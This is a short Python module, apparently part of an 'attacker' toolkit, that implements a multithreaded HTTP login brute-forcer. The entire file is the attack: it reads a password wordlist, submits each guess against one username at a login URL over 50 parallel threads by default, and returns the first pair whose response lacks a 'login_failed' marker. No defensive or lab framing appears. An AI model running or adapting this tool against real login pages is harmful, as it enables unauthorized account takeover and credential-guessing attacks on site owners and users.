# modules/attacker/brute_forcer.py  
import requests
from concurrent.futures import ThreadPoolExecutor

def try_credentials(url, username, password):
    try:
        print(f"Trying: {username}:{password}")
        response = requests.post(
            url, 
            data={"username": username, "password": password},
            timeout=5
        )
        if "login_failed" not in response.text.lower():
            return (username, password)
    except:
        return None

def http_brute_force(url, username, wordlist_path, threads=50):
    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(try_credentials, url, username, pwd) 
            for pwd in passwords
        ]
        for future in futures:
            if future.result():
                return future.result()
    return None